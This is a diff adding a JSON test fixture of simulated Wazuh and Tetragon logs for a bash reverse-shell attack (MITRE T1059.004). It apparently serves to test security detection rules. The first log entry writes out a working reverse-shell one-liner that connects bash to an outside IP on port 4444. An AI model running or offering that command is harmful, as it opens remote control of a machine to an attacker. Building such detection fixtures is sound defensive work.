@@ -1,0 +1,137 @@
+{
+  "_metadata": {
+    "attack_id": "T1059.004",
+    "variation": "001",
+    "name": "Bash Reverse Shell",
+    "description": "Attacker establishes reverse shell connection via bash",
+    "expected_detection": "CRITICAL",
+    "kill_chain_phase": "execution",
+    "format": "wazuh-native",
+    "format_version": "1.0"
+  },
+  "logs": [
+    {
+      "_comment": "Bash reverse shell execution via /dev/tcp",
+      "sequence": 1,
+      "timestamp": "2026-01-29T14:00:00.000Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Bash Reverse Shell",
+          "id": "100200",
+          "mitre": {
+            "id": [
+              "T1059.004"
+            ],
+            "tactic": [
+              "Execution"
+            ]
+          },
+          "firedtimes": 1,
+          "groups": [
+            "syslog",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "DVLNX01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.248446907",
+        "decoder": {
+          "name": "syslog"
+        },
+        "location": "/var/log/syslog",
+        "data": {
+          "facility": "authpriv",
+          "severity": "info",
+          "hostname": "DVLNX01",
+          "program": "auditd",
+          "message": "type=EXECVE msg=audit(1706536800.000:1001): argc=3 a0=\"/bin/bash\" a1=\"-i\" a2=\">&/dev/tcp/185.220.101.45/4444 0>&1\""
+        },
+        "full_log": "type=EXECVE msg=audit(1706536800.000:1001): argc=3 a0=\"/bin/bash\" a1=\"-i\" a2=\">&/dev/tcp/185.220.101.45/4444 0>&1\""
+      }
+    },
+    {
+      "_comment": "Network connection to C2 server",
+      "sequence": 2,
+      "timestamp": "2026-01-29T14:00:01.000Z",
+      "log": {
+        "rule": {
+          "level": 10,
+          "description": "Bash Reverse Shell",
+          "id": "100200",
+          "mitre": {
+            "id": [
+              "T1059.004"
+            ],
+            "tactic": [
+              "Execution"
+            ]
+          },
+          "firedtimes": 1,
+          "groups": [
+            "syslog",
+            "linux"
+          ]
+        },
+        "agent": {
+          "id": "030",
+          "name": "DVLNX01",
+          "ip": "198.51.100.30"
+        },
+        "manager": {
+          "name": "wazuh.manager"
+        },
+        "id": "1700000000.351083228",
+        "decoder": {
+          "name": "syslog"
+        },
+        "location": "/var/log/syslog",
+        "data": {
+          "facility": "authpriv",
+          "severity": "info",
+          "hostname": "DVLNX01",
+          "program": "auditd",
+          "message": "type=SOCKADDR msg=audit(1706536801.000:1002): saddr=02000011B9DC6572"
+        },
+        "full_log": "type=SOCKADDR msg=audit(1706536801.000:1002): saddr=02000011B9DC6572"
+      }
+    },
+    {
+      "_comment": "Tetragon eBPF detection of reverse shell",
+      "sequence": 3,
+      "timestamp": "2026-01-29T14:00:01.500Z",
+      "log": {
+        "tetragon": {
+          "process_exec": {
+            "process": {
+              "binary": "/bin/bash",
+              "arguments": "-i",
+              "pid": 15432,
+              "uid": 1000,
+              "cwd": "/home/www-data"
+            },
+            "parent": {
+              "binary": "/usr/sbin/apache2",
+              "pid": 1234
+            }
+          },
+          "network_connect": {
+            "dst_ip": "185.220.101.45",
+            "dst_port": 4444,
+            "protocol": "TCP"
+          }
+        },
+        "agent": {
+          "name": "DVLNX01",
+          "id": "030"
+        }
+      }
+    }
+  ]
+}
